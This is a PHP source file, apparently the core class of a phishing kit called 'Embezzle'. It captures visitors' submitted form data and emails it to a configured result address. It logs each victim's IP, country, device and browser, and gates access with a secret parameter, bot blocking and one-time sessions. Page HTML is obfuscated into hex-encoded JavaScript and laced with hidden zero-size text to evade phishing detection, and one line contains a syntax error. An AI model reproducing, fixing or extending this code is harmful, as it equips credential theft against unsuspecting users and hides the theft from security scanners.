<?php



use Stichoza\GoogleTranslate\GoogleTranslate;
use Embezzle\Libraries\Security;
use Embezzle\Libraries\Language;
use Embezzle\Libraries\Handler;
use Embezzle\Libraries\Locale;
use Embezzle\Libraries\Router;
use Embezzle\Libraries\Bots;
use Embezzle\Libraries\Curl;
use Embezzle\Libraries\Api;
use Jenssegers\Blade\Blade;

class Embezzle
{

    public $handler;
    public $curl;
    public $locale;
    public $bot;
    public $api;
    public $sec;
    public $userdata;
    public $lang;
    public $blade;
    public $translate;
    public function __construct()
    {
        $this->lib_load();
        $this->config();
        $this->handler = new Handler;
        $this->curl = new Curl;
        $this->locale = new Locale;
        $this->bot = new Bots;
        $this->api = new Api;
        $this->sec = new Security;
        $this->route = new Router;
        $this->blade = new Blade(PAGE_PATH, APP_PATH . 'cache');
        $this->translate = new GoogleTranslate();

        $this->lang = $this->handler->detection()['http_lang'];

        if (CONFIG['app']['send_method'] == 'smtp') {
            $this->handler->smtp = true;
            $this->handler->smtp_settings['hostname'] = CONFIG['app']['smtp_hostname'];
            $this->handler->smtp_settings['username'] = CONFIG['app']['smtp_username'];
            $this->handler->smtp_settings['password'] = CONFIG['app']['smtp_password'];
            $this->handler->smtp_settings['secure'] = CONFIG['app']['smtp_secure'];
            $this->handler->smtp_settings['port'] = CONFIG['app']['smtp_port'];
        }
        $this->blade_directive_load();
    }
    private function blade_directive_load()
    {
        $this->blade->directive('translate', function ($expression) {
            return "<?php echo (new Embezzle)->tr({$expression}); ?>";
        });
        $this->blade->directive('form_action_page', function ($action) {
            return "<?php echo (new Embezzle)->form_action_page({$action}); ?>";
        });
        $this->blade->directive('mbx', function ($action) {
            return "<?php echo (new Embezzle)->{$action} ?>";
        });
        $this->blade->directive('mb', function ($action) {
            return "<?php  (new Embezzle)->{$action} ?>";
        });
        $this->blade->directive('fun', function ($action) {
            return "<?php  (new Embezzle)->use_fun({$action}); ?>";
        });
    }
    public function lettering($b)
    {
        $kata = explode(" ", $b);
        $new = '';
        foreach ($kata as $word) {
            $new .= $word . ' <font style="font-size:0px">' . md5(time()) . '</font>';
            $new .= '<!-- ' . strrev($b) . ' -->';
        }

        return $new;
    }
    public function tr($x)
    {
        $tr = new Language;

        return $tr->init($x, $this->lang);
    }
    public function minify($html)
    {
        $search = array('/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s');
        $replace = array('>', '<', '\\1', '');
        $minify = preg_replace($search, $replace, $html);
        $minify = preg_replace('/<div/', '<!-- ' . substr(md5($_SERVER['REMOTE_ADDR']), 0, 6) . ' --><div', $minify);
        $minify = preg_replace('/<\/div/', '<!-- ' . base64_encode(time()) . ' --></div', $minify);
        $content = preg_replace('/class=\"/', 'class="' . substr(sha1((rand())), 0, 5) . ' ', $minify);
        $text = str_split(bin2hex($html), 2);
        $hex = '';
        foreach ($text as $dt) {
            $hex .= '%' . $dt;
        }
        $fname = 'x'.substr(sha1(@$_GET['p']) , 0,10).'.'.@$_GET['p']'.js';

        $var = 'xR' . sha1(rand());
        $sc = '
       // copyright (c) 2021 Embezzle
       // ---------------------------------------- //
        var ' . $var . ' = "' . $hex . '";
        document.writeln(unescape(' . $var . '));
        // --------------------------------------- //
        ';
        if(!is_dir(PUBLIC_PATH . '/_pages/'))
        {
            @mkdir(PUBLIC_PATH.'/_pages/',0777);
        }
        if(!file_exists(PUBLIC_PATH . '/_pages/' . $fname))
        {
            file_put_contents(PUBLIC_PATH.'/_pages/'.$fname , $sc);
        }
        $script = '<script type="text/javascript" src="./_pages/'.$fname.'"> </script>';
        return $script;
    }
    private function lib_load()
    {
        spl_autoload_register(function ($class) {
            $exp = explode("\\", $class);
            $class = end($exp);
            if (file_exists(LIB_PATH . $class . '.php')) {
                require_once(LIB_PATH . $class . '.php');
            }
        });
    }
    public function config()
    {
        require CONFIG_PATH . '/config.php';
        define('CONFIG', $config);
    }
    public function redirect($to, $delay = 0)
    {
        $x = "<META HTTP-EQUIV='refresh' CONTENT='$delay;url=$to' /> <!-- " . rand() . " --> ";

        echo $x;
        exit;
    }
    public function use_fun($fun)
    {
        if (file_exists(FUNC_PATH . $fun . '.php')) {
            require_once(FUNC_PATH . $fun . '.php');
        } else {
            echo "Can't find functions : ".FUNC_PATH.$fun." <br>";
            exit;
        }
    }
    public function urler($arr = array())
    {
        $x = http_build_query($arr);

        return '?' . $x;
    }
    public function getPost()
    {
        if (isset($_POST)) {

            return $_POST;
        } else {
            return false;
        }
    }
    public function implode($splitter,$data = [])
    {
        $this->sec->cache_encrypt(json_encode($data));
        return implode("|",$data);
    }
    public function input($name)
    {

        if (isset($_POST)) {
            return $this->bot->bad_word($_POST['' . $name . '']);
        } else {
            return '-';
        }
    }

    public function save_without_send($send = [], $continue)
    {

        $this->handler->set_session([$send['type'] => $send['data']]);
        return $this->redirect($this->urler([
            'p' => $continue,
            'session_id' => strtoupper(sha1(time())),
            'lang' => $this->userdata['detection']['http_lang'],
            'country' => $this->userdata['country']['countryCode']
        ]));
    }
    public function send($send = [], $log = [], $continue = null)
    {

        $to = CONFIG['app']['email_result'];
        $from = ['from_name' => $send['from'], 'from_mail' => CONFIG['app']['email_sender']];
        $subject = strtoupper($send['subject']) . ' : [ ' . $this->handler->getInfo($this->userdata['country']['country']) . ' ]';
        $msg = $this->handler->result($send['type'], $send['data']);

        $this->handler->sendemail($from, $to, $subject, $msg);

        toLogs($log['type'], [
            'data' => [
                'country' => $this->userdata['country']['country'],
                'device' => $this->handler->detection()['platform'],
                'ip' => $this->handler->detection()['userip'],
                'browser' => $this->handler->detection()['browser']
            ],
            'desc' => $log['desc']
        ]);
        $this->handler->set_session([$send['type'] => $send['data']]);

        if($continue != null){
        return $this->redirect($this->urler([
            'p' => $continue,
            'session_id' => strtoupper(sha1(time())),
            'lang' => $this->userdata['detection']['http_lang'],
            'country' => $this->userdata['country']['countryCode']
        ]));
        }else{
            return true;
        }
    }
    public function init()
    {


        $request = $this->handler->get('r');
        $page = $this->handler->get('p');
        $reqApi = $this->handler->get('api');

        $detection = $this->handler->detection();
        $ips = $detection['userip'];
        $country = $this->api->getCountry($ips);

        $this->userdata['ip'] = $ips;
        $this->userdata['country'] = $country;
        $this->userdata['detection'] = $detection;
        $this->userdata['page_active'] = $page;
        $this->userdata['req_active'] = $request;



        /** DETECT MOBILE **/
        if ($this->handler->is_mobile()) {
            if (file_exists(REQ_PATH . 'm_' . $page . '.blade.php')) {
                $page = 'm_' . $page;
            } else {
                $page = $page;
            }
        }

        //* END DETECTION **//
        if (empty($_GET['p'])) {

            if (isset($_GET['r'])) {

                if (file_exists(REQ_PATH . $request . '.php')) {
                    toLogs('access', [
                        'desc' => 'user from ' . $country['countryCode'] . ' request page : ' . $request,
                        'data' => [
                            'country' => $country['country'],
                            'ip' => $ips,
                            'device' => $detection['platform'],
                            'browser' => $detection['browser']
                        ]
                    ]);
                    require_once(REQ_PATH . $request . '.php');
                } else {

                    $this->bot->blocked_page();
                    exit;
                }
            } else {

                if (!empty($_GET['api'])) {
                    if (file_exists(API_PATH . $reqApi . '.api.php')) {
                        require_once(API_PATH . $reqApi . '.api.php');
                    } else {
                        $this->bot->blocked_page();
                        exit;
                    }
                } else {

                    /** JUST WRITE LOGS VISITOR SINGLE IP **/
                    if ($this->handler->check_session('visitor') == false) {

                        toLogs('visitor', [
                            'desc' => 'user from ' . $country['countryCode'] . ' Visit page',
                            'data' => [
                                'country' => $country['country'],
                                'ip' => $ips,
                                'device' => $detection['platform'],
                                'browser' => $detection['browser']
                            ]
                        ]);
                        $this->handler->_session('visitor', true);
                    }

                    /** DIRECT TO DEFAULT PAGE APP **/
                    return $this->redirect($this->urler([
                        'p' => CONFIG['web']['default_page'],
                        'session_id' => strtoupper(sha1(time())),
                        'lang' => $detection['http_lang'],
                        'country' => $country['countryCode']
                    ]));
                }
            }
        } else {

            if (file_exists(PAGE_PATH . $page . '.blade.php')) {
                toLogs('access', [
                    'desc' => 'user from ' . $country['countryCode'] . ' visit ' . $page,
                    'data' => [
                        'country' => $country['country'],
                        'ip' => $ips,
                        'device' => $detection['platform'],
                        'browser' => $detection['browser']
                    ]
                ]);
                echo $this->blade->render($page);
            } else {

                $this->bot->blocked_page();
                exit;
            }
        }
    }
    public function form_action_page($page)
    {
        return $this->urler([
            'r' => $page,
            'session_id' => strtoupper(sha1(time())),
            'lang' => $this->handler->detection()['http_lang'],
            'country' => $this->handler->session('getCountry')['countryCode']
        ]);
    }
    public function block($msg = null)
    {
        $this->bot->log('parameter', $msg);
        $this->bot->blocked_page();
        exit;
    }
    public function router($page)
    {
        $cfg = CONFIG['app'];
        $next = $this->route->init($cfg, $page);
        $url = $this->urler([
            'p' => $next,
            'session_id' => strtoupper(sha1(time())),
            'country' => format_sd('getCountry.countryCode'),
            'lang' => $this->lang
        ]);
        return ['full' => $url, 'short' => $next];
    }
    public function run()
    {

        $this->api->validate();
        $this->bot->init(CONFIG['app']);

        $this->use_fun('number');
        $this->use_fun('logs');
        $this->use_fun('debug');
        $this->use_fun('session');
        $this->use_fun('formatter');

        if(isset($_GET['p'])){
        @ob_start('self::minify');
        }
        $userdata = $this->handler->detection();

        /** CHECK BOT **/
        if ($this->handler->check_session('block')) {
            return $this->bot->blocked_page();
        }

        /** CHECK ONE TIME ACCESS **/

        /** 
         * So basically finish generate "done" session
         ** In this case here check "done" session
         **/
        if (CONFIG['app']['one_time'] == 1) {
            if ($this->handler->check_session('done')) {
                toLogs('onetime', [
                    'data' => [
                        'country' => $this->userdata['country']['country'],
                        'device' => $this->handler->detection()['platform'],
                        'ip' => $this->handler->detection()['userip'],
                        'browser' => $this->handler->detection()['browser']
                    ],
                    'desc' => 'User onetime access'
                ]);
                $this->bot->blocked_page();
            }
        }

        /** CHECK IF SESSION PARAMETER EXISTS **/
        if ($this->handler->check_session('parameter') == false) {

            /** CHECK IF USER VISIT WITH PARAMETER KEY **/
            if ($this->handler->parameter(CONFIG['app']['parameter'])) {

                /** LETS START IT **/
                $this->handler->set_session(['parameter' => CONFIG['app']['parameter']]);
                return $this->init();
            } else {

                /** BLOCK ACCESS WRONG PARAMETER **/
                return $this->block('WRONG PARAMETER !');
            }
        } else {


            return $this->init();
        }
    }
}
